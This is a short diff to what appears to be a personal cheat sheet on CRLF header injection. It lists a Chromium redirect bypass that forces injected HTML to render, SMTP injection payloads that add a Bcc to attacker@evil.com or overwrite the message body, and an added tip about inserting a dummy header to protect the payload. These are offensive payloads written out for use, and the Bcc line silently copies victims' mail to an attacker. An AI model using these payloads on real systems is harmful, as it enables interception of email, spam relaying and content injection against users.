@@ -11,6 +11,7 @@ B
 - **Chromium Redirect Bypass:** In `Location:`, use a leading space or null data before CRLF to break the redirect and force the browser to render the injected HTML body.
     
 - **SMTP Injection:** * **Add CC/BCC:** `victim@mail.com%0d%0aBcc:attacker@evil.com`
+- Always inject a dummy header so if smth trails the the email it doesnt affect our payload
     
     - **Overwrite Body:** `...%0d%0a%0d%0aNew Message Body Here`
         
